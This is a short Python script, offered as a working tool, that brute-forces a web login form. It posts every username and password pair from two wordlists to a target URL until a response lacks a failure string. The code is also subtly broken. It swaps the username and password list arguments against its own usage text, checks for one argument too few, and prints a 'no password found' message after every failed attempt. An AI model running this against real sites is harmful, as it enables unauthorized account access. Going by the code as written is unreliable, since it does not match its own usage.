import requests
import sys

if len(sys.argv) < 4:
    print("Insufficient arguments")
    print(">> Usage {} <link to login form> <needle> <username list> <password list>".format(sys.argv[0]))
    sys.exit(1)  # Exit if there are insufficient arguments

 
target = sys.argv[1]
usernames = sys.argv[4]

passwords = sys.argv[3]
needle = sys.argv[2] #this is something that the webpage returns that indicates an unsuccesful login


with open(usernames, "r") as usernames_file:
    for username in usernames_file:
        username = username.strip()
        with open(passwords, "r") as passwords_lists:
            for password in passwords_lists:
                password = password.strip("\n").encode()
                sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username,password.decode()))
                sys.stdout.flush()
                
                r = requests.post(target, data={"username": username, "password": password})
                
                if needle.encode() not in r.content:
                    sys.stdout.write("\n")
                    sys.stdout.write("\t[>>>>] Valid password '{}' found for user '{}'".format(password.decode(),username))
                    sys.exit()
                sys.stdout.flush()
                sys.stdout.write("\n")
                sys.stdout.write("\tNo password found for {}".format(username))